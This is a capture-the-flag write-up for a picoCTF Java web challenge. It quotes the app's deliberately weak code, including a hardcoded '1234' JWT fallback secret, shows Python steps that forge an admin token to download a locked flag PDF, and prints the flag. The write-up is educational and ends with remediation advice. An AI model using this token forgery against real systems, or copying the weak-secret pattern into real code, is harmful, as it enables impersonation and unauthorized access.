# Java Code Analysis!?! — CTF Write-up

**Platform:** CyLab Security Academy  
**Challenge Author:** Nandan Desai  
**Category:** Web Exploitation  
**Difficulty:** Medium  
**Event:** picoCTF 2023  
**Target Application:** BookShelf Pico  
**Status:** Solved

---

## 1. Challenge Overview

The challenge provides a web application called BookShelf Pico, an online book-reading service.

The application contains three books with different access requirements:

| Book | Required Role |
|---|---|
| Little Brother | Free |
| The Future of the Internet and How to Stop It | Premium |
| Flag | Admin |

The objective was to access the restricted Flag book without having legitimate administrator credentials.

The challenge description suggested that the application was secure and challenged us to prove otherwise by reading the Flag book.

## 2. Initial Reconnaissance

After launching the challenge instance, we accessed the BookShelf Pico application.

Initial observations:

- The application displayed three books.
- The account was authenticated as a Free user.
- The Flag book was visible but locked.
- Clicking the Flag book displayed an administrator-role requirement.

The application displayed:

```text
You need to have Admin role to access this special book!

This book is locked.
```

### Browser Network Inspection

We opened Developer Tools and inspected the Network tab.

We discovered requests related to:

- User authentication (`login`)
- Book searching (`books?q=...`)
- Book cover retrieval (`/base/books/cover/{id}`)

The cover image was accessible even though the corresponding book content was restricted.

This demonstrated the difference between accessing a resource's metadata or image and accessing its protected content.

## 3. Source Code Analysis

The challenge provided its application source code.

Instead of blindly testing endpoints, we investigated the Java implementation.

Important files:

- `SecretGenerator.java`
- `JwtService.java`
- `BookPdfAccessCheck.java`
- `BookService.java`
- `BookShelfConfig.java`

### 3.1 Discovering the Weak JWT Secret

In `SecretGenerator.java`, we discovered the following implementation:

```java
private String generateRandomString(int len) {
    // not so random
    return "1234";
}
```

The application attempted to read a secret from `server_secret.txt`.

When that file was unavailable, it used the fallback generator.

However, the fallback generator always returned:

```text
1234
```

This meant the JWT signing secret was predictable.

**Security impact:** Anyone who knows the secret can generate JWT signatures using the same signing algorithm as the application.

### 3.2 Understanding JWT Verification

In `JwtService.java`, we discovered:

```java
JWTVerifier verifier = JWT.require(algorithm)
    .withIssuer("bookshelf")
    .build();
```

This revealed an important requirement.

The JWT needed the following issuer:

```json
{
    "iss": "bookshelf"
}
```

The token also needed the expected identity claims:

- `userId`
- `email`
- `role`

The application used HS256 for JWT signing.

### 3.3 Understanding the Authorization Logic

In `BookService.java`, we found:

```java
@PostAuthorize(
    "@bookPdfAccessCheck.verify(#bookId, authentication.principal.grantedAuthorities[0].userId)"
)
public PDF getPdf(Integer bookId) {
    // ...
}
```

The method uses Spring Security's `@PostAuthorize` annotation.

It evaluates the authorization expression after the method executes and determines whether the returned result can be accessed.

The expression delegates the decision to:

```java
bookPdfAccessCheck.verify(...)
```

Inside `BookPdfAccessCheck.java`:

```java
public boolean verify(Integer bookId, Integer userId)
        throws ResourceNotFoundException {

    Book book = bookRepository.findById(bookId).get();

    User user = userRepository.findById(userId).get();

    boolean permissionGranted =
        (user.getRole().getValue() >= book.getRole().getValue());

    return permissionGranted;
}
```

This was the most important discovery.

The authorization logic retrieves the user's role directly from the database using the `userId` extracted from the authenticated principal.

It does not simply trust the role claim inside the JWT.

Therefore, changing only:

```json
"role": "Admin"
```

does not necessarily grant access.

The database identity also matters.

### 3.4 Understanding the Database Seed

In `BookShelfConfig.java`, we discovered that the application initializes two users:

| User ID in challenge database | Email | Role |
|---|---|---|
| 1 | user | Free |
| 2 | admin | Admin |

The application also seeds three books.

The source code defines their insertion order, but the actual database IDs in our running instance were different from the assumed IDs.

We confirmed the actual IDs through the book API response.

This was an important lesson: never assume database IDs when they can be discovered from actual application responses.

## 4. JWT Fundamentals

Before exploitation, we studied how JWT works.

A JSON Web Token contains three components:

```text
HEADER.PAYLOAD.SIGNATURE
```

### Header

Identifies the signing algorithm:

```json
{
    "alg": "HS256",
    "typ": "JWT"
}
```

### Payload

Contains claims describing the identity:

```json
{
    "iss": "bookshelf",
    "userId": 2,
    "email": "admin",
    "role": "Admin"
}
```

### Signature

The signature is generated using HMAC-SHA256 and the signing secret.

Conceptually:

```text
HMAC-SHA256(
    BASE64URL(header) + "." + BASE64URL(payload),
    secret
)
```

JWT payloads are Base64URL encoded, not encrypted.

Anyone can decode an ordinary JWT payload, but modifying it invalidates its original signature.

Knowing the signing secret allows an attacker to generate a new valid signature.

## 5. Exploitation

### Step 1 — Prepare Python Environment

Kali Linux uses an externally managed Python environment.

Instead of installing packages system-wide, we created a virtual environment.

```bash
python3 -m venv ~/ctf-venv
```

Activate it:

```bash
source ~/ctf-venv/bin/activate
```

Install the required packages:

```bash
pip install pyjwt requests
```

Verify:

```bash
python -c "import jwt, requests; print('Libraries ready!')"
```

### Step 2 — Generate a Forged JWT

We created a JWT using the discovered weak secret.

The important claims were:

```python
payload = {
    "iss": "bookshelf",
    "userId": 2,
    "email": "admin",
    "role": "Admin"
}
```

We selected `userId: 2` because the challenge database contained a seeded administrator with that ID.

The token was signed using:

```python
token = jwt.encode(
    payload,
    "1234",
    algorithm="HS256"
)
```

### Step 3 — Verify the JWT Locally

We used PyJWT to decode and verify the generated token.

```python
decoded = jwt.decode(
    token,
    "1234",
    algorithms=["HS256"],
    issuer="bookshelf"
)

print(decoded)
```

The decoded payload confirmed that the token was correctly generated and locally verified.

Important distinction:

Local verification only proves that our Python library can verify the token. It does not prove that the target server accepts it.

### Step 4 — Authenticate Against the Application

We sent the generated JWT to the application through the HTTP Authorization header:

```http
Authorization: Bearer YOUR_GENERATED_JWT
```

We tested the book listing endpoint:

```http
GET /base/books?q=
```

The server returned:

```http
HTTP/1.1 200 OK
Content-Type: application/json
```

The response contained:

```json
{
    "type": "SUCCESS",
    "payload": [
        {
            "id": 3,
            "title": "Little Brother",
            "role": "Free"
        },
        {
            "id": 4,
            "title": "The Future of the Internet and How to Stop It",
            "role": "Premium"
        },
        {
            "id": 5,
            "title": "Flag",
            "role": "Admin"
        }
    ]
}
```

This revealed the actual database IDs in our challenge instance.

**Important discovery:** The Flag book ID was `5`, not `3`.

### Step 5 — Access the Flag PDF

We used the generated JWT to request the protected PDF endpoint:

```http
GET /base/books/pdf/5
```

The request included our forged Bearer token.

The server accepted the request and returned the protected PDF.

We saved the response as:

```text
downloaded_flag.pdf
```

### Step 6 — Extract the Flag

First, we verified the downloaded file:

```bash
file downloaded_flag.pdf
```

Then extracted its text:

```bash
pdftotext downloaded_flag.pdf -
```

The PDF contained:

```text
Great job! Here's your flag:

academy{w34k_jwt_n0t_g00d_e89d94e3}
```

## 6. Final Flag

```text
academy{w34k_jwt_n0t_g00d_e89d94e3}
```

**Challenge successfully completed!**

## 7. Additional Learning

### 7.1 Authentication vs Authorization

These are two different security concepts.

**Authentication:** Determines who is making the request.

Example:

```text
The application validates the JWT signature.
```

**Authorization:** Determines whether that identity has permission to perform an action.

Example:

```text
Can this user access the Admin-only Flag PDF?
```

A successfully authenticated user is not automatically authorized to access every resource.

### 7.2 JWT Signing vs Encryption

JWT signing provides integrity and authenticity, not confidentiality.

A signed JWT does not hide its payload.

Therefore, sensitive information should not be placed in an ordinary JWT payload under the assumption that it is encrypted.

### 7.3 HS256 and Secret Management

HS256 uses a shared secret for both signing and verification.

If the secret is predictable, attackers can forge tokens.

A secure implementation should:

- Generate cryptographically random secrets.
- Use sufficient key length.
- Store secrets securely.
- Avoid hardcoded fallback secrets.
- Rotate compromised signing keys.

### 7.4 Spring Security `@PostAuthorize`

`@PostAuthorize` evaluates an authorization expression after a method executes.

It is useful when access decisions depend on the returned object.

However, developers should understand that the protected method may already have executed before the authorization decision is made.

For sensitive operations, consider whether `@PreAuthorize` or additional service-layer checks are appropriate.

### 7.5 Database-Backed Authorization

The challenge demonstrated why identity and authorization data must be handled carefully.

The application used a user ID extracted from the authentication principal to retrieve the database user's actual role.

Trusting attacker-controlled identity claims without securely binding them to an authenticated account can lead to identity impersonation.

### 7.6 Resource Enumeration

We initially assumed the Flag book had ID `3`.

However, the actual API response showed:

- Book ID 3: Little Brother
- Book ID 4: Future of the Internet
- Book ID 5: Flag

This taught us to inspect API responses rather than make assumptions about resource identifiers.

### 7.7 HTTP Status Codes

We also learned that:

- `200 OK` means the HTTP request succeeded.
- `401 Unauthorized` generally indicates an authentication problem.
- `403 Forbidden` indicates that access was denied.
- A successful HTTP response does not automatically prove that the intended resource was returned.

Always inspect response headers, content type, and file contents.

## 8. Other Vulnerabilities Identified During Source Analysis

These were additional observations from the supplied source analysis. They were not necessary to retrieve the challenge flag.

### Path Traversal Risk

`PathConstraintValidator.java` contains a comment about directory traversal protection.

However, the `@ValidPath` validator was not applied to the relevant DTOs.

`FileOperation.java` also directly concatenates uploaded filenames with directory paths.

This can create a path traversal vulnerability if filenames are not properly validated and normalized.

### File Upload Configuration

The configuration contained:

```properties
max-file-size=70MB
max-request-size=10MB
```

The total request limit is smaller than the individual file limit.

Consequently, a request larger than 10 MB can be rejected even when the individual file is below 70 MB.

### Misleading Method Name

The method:

```java
createFileStorageDirectories()
```

does not actually create the filesystem directories.

It initializes database records for users, roles, and books.

## 9. Remediation

The application should implement the following security improvements:

1. Replace the hardcoded JWT secret with a cryptographically secure random secret.
2. Never use predictable fallback signing keys.
3. Store signing secrets in secure configuration or a secrets manager.
4. Bind authenticated identities to trusted server-side account records.
5. Do not allow users to select arbitrary account identities through JWT claims.
6. Implement consistent authorization checks at the service layer.
7. Validate uploaded filenames and normalize filesystem paths.
8. Apply file upload validation annotations correctly.
9. Align individual file-size and total request-size limits.
10. Add automated authorization tests for Free, Premium, and Admin users.

## 10. Tools Used

| Tool | Purpose |
|---|---|
| Kali Linux | Testing environment |
| Browser Developer Tools | HTTP request inspection |
| Python 3 | JWT generation and HTTP requests |
| PyJWT | JWT signing and verification |
| Requests | Sending HTTP requests |
| curl | HTTP testing |
| pdfinfo | PDF metadata inspection |
| pdftotext | Extracting PDF content |
| Nano | Editing Python scripts |

## 11. Key Takeaways

By completing this challenge, I learned:

- How JWTs are structured.
- How HS256 signatures work.
- How weak signing secrets enable JWT forgery.
- How to generate and verify JWTs using Python.
- How Bearer token authentication works.
- How to distinguish authentication from authorization.
- How Spring Security `@PostAuthorize` works.
- How database-backed authorization decisions are implemented.
- How to inspect API responses to discover resource identifiers.
- How to troubleshoot HTTP responses and verify downloaded files.
- How to identify additional security issues through source-code analysis.

**Final lesson:** A secure application must protect both the authentication mechanism and the authorization logic. A weak JWT secret can undermine the entire identity system, even when the application contains additional permission checks.